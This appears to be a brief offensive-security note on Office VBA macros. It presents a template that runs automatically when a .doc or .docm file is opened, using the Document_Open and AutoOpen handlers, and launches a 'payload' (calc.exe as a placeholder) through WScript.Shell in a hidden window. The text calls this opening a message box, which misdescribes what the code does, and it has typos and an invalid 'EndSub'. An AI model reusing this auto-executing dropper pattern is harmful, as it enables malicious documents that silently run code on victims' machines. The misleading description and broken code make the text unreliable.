# Visuabl Basic Applications
Microsoft programming languages for applicationss such as Word, Excel, PowerPoint, etc.

A common use for VB is when building macros inside documents.

Create a macro called `TestMacro` and add the following code to open a message box automatically when a document is opened:

```
Sub Document_Open()
    TestMacro
EndSub

Sub AutoOpen()
    TestMacro
EndSub

Sub TestMacro()
    Dim payload as String
    payload = "calc.exe"
    CreateObject("WScript.Shell").Run payload,0
End Sub
```
The document must be saved as a `.doc` or `.docm`
